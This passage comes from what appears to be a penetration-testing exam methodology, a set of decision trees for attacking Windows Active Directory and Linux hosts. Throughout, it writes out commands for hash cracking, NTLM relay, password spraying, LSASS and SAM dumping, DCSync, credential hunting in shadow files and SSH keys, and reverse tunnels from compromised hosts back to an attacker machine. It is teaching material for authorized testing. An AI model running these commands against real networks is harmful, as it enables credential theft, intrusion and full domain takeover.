NetNTLMv2 hash captured via Responder
│
├── STEP 1: Save and crack immediately
│   ├── Hashes saved in /usr/share/responder/logs/
│   ├── Mode: hashcat -m 5600 hash.txt
│   ├── Dictionary: hashcat -m 5600 hash.txt rockyou.txt
│   └── Rules: hashcat -m 5600 hash.txt rockyou.txt -r best64.rule
│
├── STEP 2: While cracking runs → SMB relay check
│   ├── Was SMB signing disabled on ANY host?
│   ├── If YES → Set up relay for next capture
│   │   ├── ntlmrelayx.py -tf targets.txt -smb2support
│   │   └── ntlmrelayx.py -t http://dc/certsrv -adcs (if ADCS)
│   └── If NO relay → Crack only path
│
├── STEP 3: If cracked → Domain credential
│   ├── Determine cracked user's domain
│   ├── Immediately: BloodHound enumeration
│   ├── Immediately: Password spray (same password, other users)
│   ├── Immediately: Test against all hosts
│   └── Immediately: Kerberoasting (if domain user)
│
├── STEP 4: If NOT cracked
│   ├── Check hash format (cut or paste issues?)
│   ├── Try different wordlist (SecLists, bigger rockyou)
│   ├── Try rule-based with d3ad0ne.rule
│   ├── Try mask attack (season+year patterns)
│   └── Leave running in background, come back later
│
└── STEP 5: Continue Responder
    ├── Responder runs continuously — don't stop
    ├── More users will be captured over time
    └── Different users may have weaker passwords
```

### Credentials Obtainable
- Domain user cleartext password (if cracked)
- Other domain users from continued Responder

### Privilege Escalation Opportunities
- Domain user on local admin groups → Admin on some hosts
- Domain user → Check local admin via SMB

### Lateral Movement Opportunities
- Domain user credentials → Test across all domain hosts
- Password spray pattern → Discover more users

### Domain Escalation Opportunities
- ANY domain user → BloodHound → AD attack chain
- Password spray (cracked password variants) → More domain access

### If This Fails
- Hash doesn't crack → Need more time or better wordlist
- No relay path → Crack-only approach
- Only non-domain users captured → Keep Responder running

### Cross-References
- Responder technical setup → [Module 11](11-active-directory.md)
- Hashcat cracking → [Module 06](06-password-attacks.md)
- SMB relay → [Module 12](12-lateral-pivot.md)

---

## Finding: Port 88 (Kerberos) Open

### What To Do Next

```
Kerberos port 88 open → Domain controller identified
│
├── STEP 1: Verify domain controller
│   ├── nmap -sV -p 88 target → Check "kerberos-sec"
│   ├── nslookup -type=SRV _kerberos._tcp.domain.local
│   └── dig -t SRV _kerberos._tcp.domain.local
│
├── STEP 2: AS-REP Roasting (no creds needed)
│   ├── Kerbrute user enumeration first: kerbrute userenum -d domain
│   └── Impacket: GetNPUsers -dc-ip dc -usersfile users.txt domain/
│       └── Found user without pre-auth? → Crack hashcat -m 18200
│
├── STEP 3: Kerbrute user enumeration
│   ├── kerbrute userenum -d domain.local --dc dc users.txt
│   └── No user list? Generate from common patterns
│       ├── Firstname.Lastname, flastname, firstname.lastname@domain
│       └── Use: /usr/share/seclists/Usernames/Names/names.txt
│
├── STEP 4: Password spray (if you have users)
│   ├── netexec smb dc -u users.txt -p 'CompanyName1!'
│   ├── netexec smb dc -u users.txt -p 'Spring2024!'
│   └── Start slow — 1 password per 30 min to avoid lockout
│
└── STEP 5: Other Kerberos attacks
    ├── Check for MS14-068 (legacy but check)
    ├── Check for CVE-2021-42278/42287 (NoPac)
    └── If domain creds obtained: Full Kerberos attack chain
```

### Credentials Obtainable
- AS-REP roastable user hash → Crack → Credential
- Valid domain user from password spray
- Kerbrute reveals existing domain users

### Privilege Escalation Opportunities
- Domain user → AD privilege escalation chain
- Bypass pre-auth user → First foothold

### Lateral Movement Opportunities
- Any domain credential → Access to domain-joined hosts
- Kerberos TGT → Pass-the-Ticket

### Domain Escalation Opportunities
- First domain user → BloodHound → Full AD attack chain

### If This Fails
- No AS-REP roastable users → Move to Responder hash capture
- No users from Kerbrute → Try different user naming patterns
- Cannot enumerate at all → Check for LDAP anonymous bind
- No domain connectivity → Check DNS configuration

### Cross-References
- AD attacks → [Module 11](11-active-directory.md)
- Password spray → [Module 06](06-password-attacks.md)

---

## Finding: Port 389/636 (LDAP) Open

### What To Do Next

```
LDAP port 389/636 open → Domain controller or LDAP server
│
├── STEP 1: Check for anonymous bind
│   ├── ldapsearch -x -h target -b "dc=domain,dc=local"
│   │   ├── SUCCESS → Full domain read without credentials!
│   │   │   ├── Dump ALL users → Password spray
│   │   │   ├── Dump groups → Identify admins, service accounts
│   │   │   ├── Dump computers → Target list
│   │   │   └── Dump domain trusts → Trust paths
│   │   └── FAILURE → Need credentials, move to other avenues
│   └── ldapdomaindump -u '' -p '' target (if anonymous allowed)
│
├── STEP 2: Authenticated LDAP enumeration
│   ├── Get domain creds from elsewhere → Full LDAP dump
│   ├── ldapdomaindump -u domain\\user -p pass target
│   ├── windapsearch.py → Modern Python LDAP enum
│   └── BloodHound: bloodhound-python -u user -p pass -d domain -ns dc
│
└── STEP 3: LDAP-specific attacks
    ├── LDAP signing not enforced? → LDAP relay possible
    └── Pass-back attacks (if you control LDAP server)
```

### Credentials Obtainable
- Full LDAP tree (anonymous) → User list, group list
- Password in description fields (common admin practice)
- Service account information

### Privilege Escalation Opportunities
- User list → Password spray → Domain user
- Service account identification → Targeted Kerberoasting

### Lateral Movement Opportunities
- Computer list → Full target inventory
- Trust information → Cross-domain paths

### Domain Escalation Opportunities
- Complete AD structure map → Efficient BloodHound targeting
- All domain users → Password spray → Domain access

### If This Fails
- Anonymous bind disabled → Need credentials from other sources
- LDAP requires signing → Cannot relay, move to other attacks

### Cross-References
- Domain enumeration → [Module 11](11-active-directory.md)
- User spraying → [Module 06](06-password-attacks.md)

---

## Finding: Port 5985/5986 (WinRM) Open

### What To Do Next

```
WinRM port 5985/5986 open
│
├── STEP 1: Credentials available?
│   ├── YES → evil-winrm -i target -u user -p pass
│   │   └── SUCCESS → Interactive Windows shell
│   ├── YES (hash) → evil-winrm -i target -u user -H hash
│   │   └── SUCCESS → Interactive Windows shell
│   └── NO → Move to Step 2
│
├── STEP 2: Password spray (if you have usernames)
│   ├── netexec winrm target -u users.txt -p 'password'
│   ├── Netexec handles WinRM brute force efficiently
│   └── Always try default admin: administrator:(empty), admin:admin
│
├── STEP 3: Post-access
│   ├── whoami /priv → Check token privileges
│   ├── whoami /groups → Group memberships
│   ├── systeminfo → OS version
│   ├── ipconfig → Network configuration
│   └── netstat -ano → Active connections
│
└── STEP 4: Privilege escalation (if non-admin)
    ├── Module 10: Windows PrivEsc
    └── Especially: SeImpersonate → Potato exploit
```

### Credentials Obtainable
- From shell: SAM/LSASS dump → All local/domain credentials
- From shell: config file search → Application credentials

### Privilege Escalation Opportunities
- Full Windows priv escalation chain
- Potato exploits if SeImpersonate privilege
- Service misconfigurations

### Lateral Movement Opportunities
- LSASS dump → Domain credentials → Lateral movement
- Pass-the-Hash from harvested hashes
- PowerShell remoting to other hosts

### Domain Escalation Opportunities
- Domain-joined host → AD enumeration module
- LSASS dump → Domain user credentials
- Cached domain credentials → Kerberos attacks

### If This Fails
- WinRM not accessible → Check firewall rules
- No credentials → Get creds from other sources
- Try alternative protocols: SMB, RDP, WMI

### Cross-References
- Windows shell access → [Module 05](05-initial-access.md)
- Windows privesc → [Module 10](10-windows-privesc.md)
- Credential harvesting → [Module 13](13-post-exploitation.md)

---

## Finding: Shell on Linux Host

### What To Do Next

```
Shell obtained on Linux system
│
├── STEP 1: Initial enumeration
│   ├── whoami / id → Current user + groups
│   ├── hostname → System name (clue to AD join?)
│   ├── ip addr / ifconfig → Network interfaces
│   ├── ip route → Routing table
│   ├── cat /etc/os-release → OS version
│   ├── uname -a → Kernel version
│   └── ps aux → Running processes
│
├── STEP 2: Check for domain join
│   ├── realm list → SSSD/realmd domain info
│   ├── cat /etc/krb5.keytab → Kerberos keytab exists?
│   ├── klist → Cached Kerberos tickets?
│   ├── cat /etc/sssd/sssd.conf → AD join creds
│   └── If domain joined → [CRITICAL] AD attack path
│
├── STEP 3: Credential hunting (Module 13)
│   ├── cat /etc/shadow (if root or readable)
│   ├── ls -la /home/* → Other users' homes
│   ├── find / -name "id_rsa" 2>/dev/null → SSH keys
│   ├── find / -name "*.env" -o -name "*.config" 2>/dev/null
│   ├── find / -name "wp-config.php" -o -name "config.php" 2>/dev/null
│   ├── cat ~/.bash_history → Password in commands
│   ├── cat /root/.bash_history (if root)
│   └── cat /var/www/html/config.php → Web app DB creds
│
├── STEP 4: Network enumeration for pivoting
│   ├── ip route → Other subnets?
│   ├── arp -a → Recent ARP entries
│   ├── cat /etc/hosts → Known hostnames
│   ├── netstat -tlnp → Listening services
│   └── nmap -sn <local_subnet>/24 (if nmap installed)
│
├── STEP 5: Privilege escalation (Module 09)
│   ├── sudo -l → Sudo privileges
│   ├── find / -perm -4000 -type f → SUID binaries
│   ├── getcap -r / 2>/dev/null → Capabilities
│   ├── cat /etc/crontab → Cron jobs
│   ├── If root → Full cred harvesting + lateral
│   └── If not root → Linux priv escalation chain
│
└── STEP 6: Shell upgrade
    ├── python3 -c 'import pty;pty.spawn("/bin/bash")'
    ├── Then Ctrl+Z → stty raw -echo; fg
    └── export TERM=xterm
```

### Credentials Obtainable
- /etc/shadow → Password hashes for all users
- SSH private keys → SSH to other hosts
- Config files → Database, application credentials
- Bash history → Passwords typed in commands
- /root/.ssh/ → Root SSH keys
- Kerberos keytab → Domain machine account hash
- Mimipenguin → Cleartext creds from memory

### Privilege Escalation Opportunities
- Sudo misconfiguration → Root
- SUID binary → Root
- Kernel exploit → Root
- Docker/LXD group → Container escape → Root
- Cron job injection → Root
- Capability abuse → Root

### Lateral Movement Opportunities
- SSH keys → SSH to other hosts
- Domain machine account → SMB/WinRM to Windows hosts
- Cached Kerberos tickets → Pass-the-Ticket
- Database credentials → DB server access
- Domain credentials → Full AD lateral movement

### Domain Escalation Opportunities
- Domain-joined host → AD enumeration
- Kerberos keytab → Machine account abuse
- Cached domain credentials → Domain user access
- SSSD cache → Domain credential extraction

### If This Fails
- No creds found → Use linpeas for deeper enumeration
- Can't privesc → Check all 12 vectors in Module 09
- No pivot needed → Move to service enumeration
- Check for Docker containers (may be inside container)

### Cross-References
- Linux priv escalation → [Module 09](09-linux-privesc.md)
- Credential harvesting → [Module 13](13-post-exploitation.md)
- Lateral movement → [Module 12](12-lateral-pivot.md)
- AD attacks → [Module 11](11-active-directory.md)
- Shell upgrade → [Module 05](05-initial-access.md)

---

## Finding: Shell on Windows Host

### What To Do Next

```
Shell obtained on Windows system
│
├── STEP 1: Initial enumeration
│   ├── whoami → Current user
│   ├── whoami /priv → Token privileges
│   ├── whoami /groups → Group memberships
│   ├── hostname → System name
│   ├── systeminfo → OS version, patch level
│   ├── ipconfig → Network interfaces
│   ├── ipconfig /displaydns → DNS cache
│   ├── netstat -ano → Active connections
│   ├── route print → Routing table
│   └── arp -a → ARP cache
│
├── STEP 2: Check for domain join
│   ├── systeminfo | findstr Domain
│   ├── echo %USERDOMAIN%
│   ├── set USER → Environment user info
│   └── If domain joined → [CRITICAL] AD attack path
│
├── STEP 3: Is the current user admin?
│   ├── net localgroup Administrators
│   ├── whoami /groups | findstr S-1-5-32-544
│   └── If admin → SYSTEM via token or seDebug
│
├── STEP 4: Credential harvesting
│   ├── IF ADMIN:
│   │   ├── LSASS dump: procdump -ma lsass.exe lsass.dmp
│   │   │   └── Offline: mimikatz sekurlsa::logonpassages
│   │   ├── SAM dump: reg save HKLM\SAM sam
│   │   │            reg save HKLM\SYSTEM system
│   │   │            secretsdump.py -sam sam -system system LOCAL
│   │   ├── LSA secrets: reg save HKLM\SECURITY security
│   │   └── DCSync (if DC): secretsdump.py -just-dc domain/user:pass@DC
│   │
│   └── IF NOT ADMIN:
│       ├── cmdkey /list → Stored credentials
│       ├── PowerShell history: (Get-PSReadlineOption).HistorySavePath
│       ├── findstr /si password *.txt *.config *.xml
│       ├── Unattend.xml, web.config, .env files
│       └── Browser saved passwords (Chrome/Firefox)
│
├── STEP 5: Check for pivoting opportunities
│   ├── Multi-homed? → Deploy pivot tool
│   ├── Route to other subnets? → Add routes
│   └── DNS cache shows internal hostnames?
│
└── STEP 6: Privilege escalation (if not admin)
    ├── Module 10: Windows PrivEsc
    ├── SeImpersonate → Potato exploit → SYSTEM
    ├── Service misconfig → SYSTEM
    └── Check: always interesting on Windows
```

### Credentials Obtainable
- LSASS dump → Domain user credentials, service account passwords
- SAM dump → Local account hashes
- LSA secrets → Service account passwords
- DPAPI master keys → Browser passwords, cert private keys
- Cached domain credentials
- PowerShell history → Plaintext passwords in commands
- Config files → Database/application credentials

### Privilege Escalation Opportunities
- Token privilege abuse (SeImpersonate, SeDebug, SeBackup)
- Service misconfiguration (unquoted paths, writable binaries)
- UAC bypass (if admin but filtered)
- Kernel exploit
- Group membership abuse (DnsAdmins, Server Operators)

### Lateral Movement Opportunities
- LSASS dump → Domain credentials → Pass-the-Hash
- Local admin hash → Same password on other hosts
- Cached domain creds → Kerberos tickets
- WinRM/SMB to other domain hosts

### Domain Escalation Opportunities
- Domain credentials → BloodHound → AD attack chain
- LSASS on DC → DCSync → All domain hashes
- Cached domain admin → Immediate DA

### If This Fails
- Can't dump LSASS → Check AV/EDR status (may block)
- No priv escalation → Run winPEAS, check all vectors
- No network access → Check firewall, re-enumerate

### Cross-References
- Windows priv escalation → [Module 10](10-windows-privesc.md)
- Credential harvesting → [Module 13](13-post-exploitation.md)
- Lateral movement → [Module 12](12-lateral-pivot.md)
- AD attacks → [Module 11](11-active-directory.md)

---

## Finding: Domain-Joined Host Compromised

### What To Do Next

```
Shell on domain-joined host (Windows or Linux)
│
├── STEP 1: Determine privilege level
│   ├── Administrator/root? → Full domain credential harvest
│   ├── Local user? → Limited AD access
│   └── Service account? → Check AD privileges
│
├── STEP 2: Dump domain credentials (if admin)
│   ├── Windows:
│   │   ├── mimikatz sekurlsa::logonpassages → Domain user creds
│   │   ├── secretsdump.py → Domain/enterprise admin if DC
│   │   └── Kiwi (MSF) → Same as mimikatz
│   ├── Linux domain-joined:
│   │   ├── keytab file → Machine account hash
│   │   ├── klist → Cached Kerberos tickets
│   │   └── SSSD cache → Domain user credentials
│   └── Save ALL credentials
│
├── STEP 3: BloodHound enumeration
│   ├── bloodhound-python -u user -p pass -d domain -ns dc
│   ├── SharpHound.exe (on Windows target)
│   └── Analyze paths to DA
│
├── STEP 4: Kerberoasting (if domain user)
│   ├── GetUserSPNs -dc-ip dc domain/user:pass -request
│   └── Crack TGS tickets → Service account passwords
│
├── STEP 5: Active Directory attack chain
│   ├── Delegation abuse
│   ├── ACL abuse
│   ├── ADCS attack
│   ├── DCSync target
│   └── Trust attack
│
└── STEP 6: Check for additional attack paths
    ├── SQL servers with domain service accounts
    ├── Web apps with AD authentication
    └── File shares with sensitive domain data
```

### Credentials Obtainable
- ALL credentials from LSASS/SAM/LSA
- Domain machine account hash (Linux keytab)
- Cached TGT/TGS tickets
- Service account passwords (Kerberoast)

### Privilege Escalation Opportunities
- Domain user → DA via AD attack chain
- Machine account → Limited but useful for AD
- Service account → Potential privileged domain access

### Lateral Movement Opportunities
- Domain creds → SMB/WinRM/RDP to ALL domain hosts
- Machine account → Limited lateral movement
- Pass-the-Hash → Any domain-joined host

### Domain Escalation Opportunities
- BloodHound → Find DA path → Full domain compromise
- DCSync (if eligible) → All domain hashes
- Golden Ticket → Persistent domain access

### If This Fails
- No AD path → Need more credentials (other users/accounts)
- Host is not critical → Move to other AD enumeration
- Limited access → Check trust relationships
- Consider Linux domain-joined host (less common but valuable)

### Cross-References
- Full AD attack chain → [Module 11](11-active-directory.md)
- Credential dumping → [Module 13](13-post-exploitation.md)
- Lateral movement → [Module 12](12-lateral-pivot.md)

---

## Finding: BloodHound DA Path Found

### What To Do Next

```
BloodHound reveals a path to Domain Admin
│
├── STEP 1: Validate the path manually
│   ├── Don't blindly follow BloodHound — verify step by step
│   ├── Confirm each edge is actually exploitable
│   └── Check if target objects exist and are accessible
│
├── STEP 2: Execute the path step by step
│   │
│   ├── Path type: Session → Cred theft
│   │   ├── DA has session on host
│   │   ├── Need admin on that host → LSASS dump
│   │   └── → Domain Admin credentials
│   │
│   ├── Path type: Kerberoast
│   │   ├── User can Kerberoast a privileged account
│   │   ├── Crack TGS → Service account password
│   │   └── → Lateral → DA
│   │
│   ├── Path type: ACL abuse
│   │   ├── GenericAll on user/group → Modify attributes
│   │   ├── ForceChangePassword → Change DA password
│   │   ├── WriteOwner → Take control → Modify ACL
│   │   ├── WriteDACL → Grant DCSync
│   │   └── AddMember → Add self to DA group
│   │
│   ├── Path type: Delegation
│   │   ├── Unconstrained → Compromise host → Steal TGT
│   │   ├── Constrained → getST → Impersonate DA
│   │   └── RBCD → Set AllowedToActOnBehalf → Impersonate
│   │
│   ├── Path type: ADCS
│   │   ├── ESC1: low-priv user can enroll + SAN
│   │   ├── ESC3: Certificate Request Agent
│   │   ├── ESC8: NTLM relay to ADCS
│   │   └── ESC9/10: No security extension
│   │
│   ├── Path type: DCSync
│   │   └── Account has DCSync rights → Dump all hashes
│   │
│   └── Path type: GPO abuse
│       └── Write access to GPO → Deploy malicious policy → DA
│
├── STEP 3: Document the path
│   ├── Screenshot BloodHound graph
│   ├── Note each node and edge
│   └── Save for report evidence
│
└── STEP 4: After DA compromise
    ├── DCSync → All domain hashes
    ├── Golden Ticket → Persistent access
    ├── Trust enumeration → Parent domain? Forest trust?
    └── Full domain dominance → Check Module 11 for next steps
```

### Credentials Obtainable
- Domain admin credentials
- All domain user/service account hashes (DCSync)
- KRBTGT hash (Golden Ticket)

### Privilege Escalation Opportunities
- DA → DCSync → Full domain control
- DA → Enterprise Admin (if part of forest)

### Lateral Movement Opportunities
- DA → Any host in domain
- DA → Any service in domain
- DA → Password hash export for all users

### Domain Escalation Opportunities
- DCSync → KRBTGT → Golden Ticket
- Trust abuse → Parent domain compromise
- Forest trust → Cross-forest compromise

### If This Fails
- Path not actually exploitable → Check permissions carefully
- Target doesn't exist → BloodHound data may be stale
- Path requires admin → Need to escalate one more step
- Check for alternative paths (BloodHound usually finds multiple)

### Cross-References
- Full AD attack chain → [Module 11](11-active-directory.md)
- Post-exploitation → [Module 13](13-post-exploitation.md)

---

## Finding: Multi-Homed Host Discovered

### What To Do Next

```
Multi-homed host discovered (2+ NICs, different subnets)
│
├── STEP 1: Confirm multi-homed status
│   ├── Linux: ip addr, ip route, ifconfig
│   └── Windows: ipconfig, route print
│
├── STEP 2: Identify reachable subnets
│   ├── Note all IP addresses on all interfaces
│   ├── Note all routes in routing table
│   └── Check ARP cache for hosts on other subnets
│
├── STEP 3: Deploy pivot tool
│   ├── Root/Admin on pivot?
│   │   ├── YES → Ligolo-ng (best: full VPN tunnel)
│   │   │   ├── Target: ./ligolo-agent -connect attacker:11601 -ignore-cert
│   │   │   └── Attacker: sudo ip route add <subnet>/24 dev ligolo
│   │   ├── NO root → Chisel (SOCKS proxy, no root needed)
│   │   │   ├── Attacker: chisel server -p 8000 --reverse
│   │   │   └── Target: chisel client attacker:8000 R:1080:socks
│   │   └── SSH access? → SSHuttle (Linux only)
│   │       └── sshuttle -r user@pivot <new_subnet>/24
│
├── STEP 4: Scan new subnet through pivot
│   ├── Full TCP scan of new subnet hosts
│   ├── Service version detection
│   ├── Spray known creds against new hosts
│   └── Check for AD domain in new subnet
│
└── STEP 5: Repeat methodology from Module 02
    └── New hosts found → Full enumeration loop
        ├── Web servers? → Module 04
        ├── Service ports? → Module 07
        └── Domain hosts? → Module 11
```

### Credentials Obtainable
- New hosts → New credential harvesting opportunities
- Different domain/subnet → Different credential sets

### Privilege Escalation Opportunities
- New hosts → New priv escalation opportunities
- Better host may have different privesc paths

### Lateral Movement Opportunities
- Pivot deployment enables movement to new subnet
- Known credentials on new hosts → Immediate access

### Domain Escalation Opportunities
- New subnet may contain DC, exchange, other critical AD hosts
- Different domain in new subnet → Trust attack potential

### If This Fails
- No root on pivot → Use chisel (no root needed)
- Egress filtering blocks pivot → Try different port/protocol
- Only one NIC → Check routing table for indirect routes
- No new hosts → Previous subnet was the only target

### Cross-References
- Pivoting methods → [Module 12](12-lateral-pivot.md)
- Re-enumeration → [Module 02](02-enumeration.md)

---

## Finding: Password Spraying Successful

### What To Do Next

```
Password spraying worked — valid credential(s) discovered
│
├── STEP 1: Document the credential immediately
│   ├── Username, password, domain
│   ├── How it was found (which service, which attempt)
│   └── Tag the user's privilege level (if known)
│
├── STEP 2: Test the credential
│   ├── Domain credential?
│   │   ├── BloodHound: bloodhound-python -u user -p pass -d domain -ns dc
│   │   ├── LDAP dump: ldapdomaindump -u domain\\user -p pass dc
│   │   ├── Kerberoast: GetUserSPNs -request
│   │   └── SMB check: netexec smb dc -u user -p pass
│   │
│   ├── Local credential?
│   │   ├── SMB: netexec smb target -u user -p pass
│   │   ├── WinRM: evil-winrm -i target -u user -p pass
│   │   ├── RDP: xfreerdp /v:target /u:user /p:pass
│   │   └── SSH: ssh user@target
│   │
│   └── Web credential?
│       └── Login to web app, check functionality
│
├── STEP 3: Spray MORE (you have a pattern now)
│   ├── Same password, DIFFERENT services
│   ├── Password variants (CompanyName2!, CompanyName3!)
│   └── Spray against remaining users not yet tested
│
└── STEP 4: Run AD attack chain with new creds
    ├── BloodHound → DA path check
    ├── Kerberoast → More service account creds
    └── ACL enumeration → Potential DA escalation
```

### Credentials Obtainable
- More domain users from spray pattern
- Service account credentials from Kerberoast
- Domain admin information from BloodHound

### Privilege Escalation Opportunities
- Domain user may be local admin on some hosts
- Service account → Check for privileged access

### Lateral Movement Opportunities
- Domain credentials → SMB/WinRM/RDP across domain hosts
- Password reuse pattern → Test on all services

### Domain Escalation Opportunities
- Domain user → BloodHound → AD attack chain
- Multiple domain users → Increased attack surface
- Service account → Kerberoast → Lateral movement

### If This Fails
- User has no special privileges → Just another domain user
- Credential tested everywhere but no access → Check firewalls
- Account locked out → Wait for reset, try slower

### Cross-References
- Password spray strategy → [Module 06](06-password-attacks.md)
- AD enumeration → [Module 11](11-active-directory.md)

---

## Stuck: No Initial Access

### Diagnosis

```
Checklist — have you done ALL of these?
│
├── [ ] Scanned ALL 65535 TCP ports on ALL hosts?
│   └── If not: full TCP scan may find missed services
├── [ ] Scanned top 100 UDP ports?
│   └── If not: SNMP/TFTP may provide foothold
├── [ ] Tried default credentials on ALL services?
│   └── If not: try admin:admin, root:root, etc.
├── [ ] Checked for SMB null sessions?
│   └── If not: null session = user enum = password spray
├── [ ] Checked for LDAP anonymous bind?
│   └── If not: anonymous bind = full user/group dump
├── [ ] Run Responder for hash capture?
│   └── If not: Responder = NetNTLM capture = crack
├── [ ] Tried AS-REP roasting?
│   └── If not: no-pre-auth users = easy creds
├── [ ] Tried Kerbrute user enumeration + spray?
│   └── If not: user enum + common passwords
├── [ ] Used ffuf with multiple wordlists on all web servers?
│   └── If not: content discovery finds hidden endpoints
├── [ ] Tried all injection types (SQLi, LFI, CMDi, XSS)?
│   └── If not: comprehensive injection testing
├── [ ] Checked for version-specific exploits?
│   └── If not: searchsploit every service version
├── [ ] Checked for MS17-010 (EternalBlue)?
│   └── If not: legacy SMB exploit = SYSTEM
├── [ ] Checked for anonymous/guest FTP?
│   └── If not: anonymous FTP = files = creds
├── [ ] Checked for NFS exports?
│   └── If not: mounted share = SSH keys = access
├── [ ] Checked for SNMP public community?
│   └── If not: SNMP read = user/process enumeration
└── [ ] Verified network connectivity?
    └── If not: VPN active? Routes correct?
```

### Recovery Actions

- **Still stuck after checklist?** Switch to a completely different approach:
  1. Re-read scope: Did you miss an attack surface?
  2. External recon: More subdomains? Different IPs?
  3. Review methodology from start: Did you skip a module?
  4. Take a break: 15-minute walk, then re-review notes
  5. Check exam forums (carefully, no spoilers)
  6. Try pivot (if you have ANY access on ANY host)
  7. Last resort: Reset environment, start fresh

### Cross-References
- Web testing → [Module 04](04-web-application.md)
- Service testing → [Module 07](07-common-services.md)
- Password attacks → [Module 06](06-password-attacks.md)
- AD attacks → [Module 11](11-active-directory.md)

---

## Stuck: No Privilege Escalation

### Diagnosis

```
Linux checklist:
├── [ ] sudo -l (ALL) ALL → sudo su (DID YOU TRY THIS?)
├── [ ] Checked every SUID binary with GTFOBins?
├── [ ] Run pspy64 for 5+ minutes to find transient cron?
├── [ ] Checked capabilities: getcap -r / 2>/dev/null
├── [ ] Checked Docker/LXD group membership?
├── [ ] Checked NFS exports with root_squash disabled?
├── [ ] Checked /etc/crontab AND /etc/cron.d/*?
├── [ ] Checked all users' home directories for SSH keys?
├── [ ] Checked writable /etc/passwd?
├── [ ] Checked PATH abuse / LD_PRELOAD?
├── [ ] Checked for shared object hijacking?
├── [ ] Ran linpeas.sh (full output review)?
└── [ ] Checked kernel exploits for version?

Windows checklist:
├── [ ] Checked whoami /priv for ALL privileges?
├── [ ] SeImpersonate → Tried Potato exploit?
├── [ ] Checked service misconfigs (unquoted, writable)?
├── [ ] Checked AlwaysInstallElevated (registry)?
├── [ ] Checked scheduled tasks for writable scripts?
├── [ ] Checked registry autoruns for writable paths?
├── [ ] Checked cmdkey /list for stored creds?
├── [ ] Checked for GPP passwords (groups.xml in SYSVOL)?
├── [ ] Checked for unattend.xml/deploy.xml?
├── [ ] Checked PowerShell history?
├── [ ] Checked for mounted VHD/VHDX?
├── [ ] Ran winPEASany.exe (full output review)?
└── [ ] Checked kernel exploits via Windows Exploit Suggester?
```

### Recovery Actions

- **Still stuck after checklist:** Consider:
  1. You may already be admin (check with actual test, not just whoami)
  2. Host may not have escalation path (some exam hosts are just footholds)
  3. Focus on credential harvesting instead → usable creds > root
  4. Check for other users logged in (can you ps/tasklist them?)
  5. Check if host is domain-joined → AD approach instead
  6. Move to another host — not every host escalates to root

### Cross-References
- Linux priv escalation → [Module 09](09-linux-privesc.md)
- Windows priv escalation → [Module 10](10-windows-privesc.md)
- Alternative: credential harvesting → [Module 13](13-post-exploitation.md)

---

## Stuck: No AD Attack Path

### Diagnosis

```
Checklist:
├── [ ] Do you have ANY domain credentials?
│   └── If no: See "no credentials" recovery
├── [ ] Did you run BloodHound with ALL collection methods?
│   └── No: bloodhound-python -c All to get all edges
├── [ ] Did you check Kerberoasting?
│   └── No: GetUserSPNs -request → crack TGS tickets
├── [ ] Did you check AS-REP roasting?
│   └── No: GetNPUsers → users without pre-auth
├── [ ] Did you check delegation (unconstrained/constrained/RBCD)?
│   └── No: findDelegation / certipy checks
├── [ ] Did you check ADCS (certipy find)?
│   └── No: certipy find may reveal critical vuln
├── [ ] Did you check ALL ACL attack edges?
│   └── BloodHound: ForceChangePassword, GenericAll, WriteOwner, etc.
├── [ ] Did you check trust relationships?
│   └── No: Child → parent? Cross-forest?
├── [ ] Did you check LAPS configuration?
│   └── No: Can you read LAPS passwords for local admin?
├── [ ] Did you check gMSA accounts?
│   └── No: Can you retrieve gMSA passwords?
├── [ ] Did you check DNS Admin group?
│   └── No: DNS admin can load DLL on DC
├── [ ] Did you check SMB signing → relay to ADCS?
│   └── No: Relay to http://dc/certsrv → Cert → DA
├── [ ] Did you check for Shadow Credentials?
│   └── No: msDS-KeyCredentialLink on privileged accounts
├── [ ] Did you compromise MORE hosts?
│   └── No: Different users on different hosts
├── [ ] Did you spray ALL passwords against ALL users?
│   └── No: More spray = more accounts
└── [ ] Did you check for GPO abuse?
    └── No: Write GPO → deploy malicious settings → DA
```

### Recovery Actions
- **Still stuck:** Consider domain is hardened or you haven't found the path yet
  1. Compromise more hosts (different users = different AD access)
  2. Focus on password attacks (spray, crack, repeat)
  3. Check for unauthenticated vectors (anonymous LDAP, null session)
  4. Consider cross-forest/trust paths
  5. Verify you haven't missed a critical BloodHound edge type
  6. Check all ADCS ESC scenarios (1-10)

### Cross-References
- Full AD attack chain → [Module 11](11-active-directory.md)
- Password attacks → [Module 06](06-password-attacks.md)
- Lateral movement → [Module 12](12-lateral-pivot.md)

---

## Quick Reference: After Every Foothold

```
New host compromised?
├── [IMMEDIATE] Check: whoami / id, ipconfig / ifconfig, netstat
├── [HOST] Credential harvest (Module 13)
├── [CRACK] Hashcat in background (Module 06)
├── [PRIVESC] Check escalation vectors (Module 09/10)
├── [AD] Check domain join (Module 11)
├── [PIVOT] Check routing for other subnets (Module 12)
├── [SPRAY] Test all creds against all hosts
└── [LOOP] RESTART on any new hosts discovered
```

---

## Quick Reference: Credential Flow

```
Credential obtained → Where to use it:
│
├── LOCAL credential (non-domain)
│   ├── Test on originating host (other services)
│   ├── Test on ALL hosts (password reuse)
│   └── If admin → Dump more credentials (Module 13)
│
├── DOMAIN credential
│   ├── BloodHound enumeration (Module 11)
│   ├── Kerberoasting (Module 11)
│   ├── Spray domain users (Module 06)
│   ├── Test ALL domain hosts (Module 12)
│   └── If admin → DCSync → Full domain (Module 11)
│
├── SERVICE ACCOUNT credential
│   ├── Check service hosts (Module 07/08)
│   ├── Test for local admin on service host
│   ├── Kerberoast (if SPN + not already TGS)
│   └── Check delegation ability
│
└── DEBUG: If credential doesn't work anywhere
    ├── Check username format (DOMAIN\user, user@domain)
    ├── Check service type (NTLM vs Kerberos)
    ├── Account may be disabled or expired
    └── Try overpass-the-hash (NTLM → Kerberos)
```
